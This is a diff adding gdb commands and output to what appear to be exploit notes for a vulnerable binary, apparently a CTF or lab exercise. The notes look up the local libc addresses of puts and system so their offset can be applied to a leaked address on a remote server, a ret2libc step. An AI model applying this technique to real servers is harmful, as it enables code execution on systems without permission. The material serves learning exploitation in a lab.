@@ -12,3 +12,11 @@ SEGFAULT - x45454545 in ?? ()
 # we can lookup locally systems and puts locations in libc, that will give us a delta.
 # when we run on the server, we can apply that offset to what the output says to find where system is.
 
+gdb ./vuln
+break *main
+run
+(gdb) x puts
+0xf7e322c0 <puts>:	0x57e58955
+(gdb) x system
+0xf7e07c00 <system>:	0x0f9568e8
+
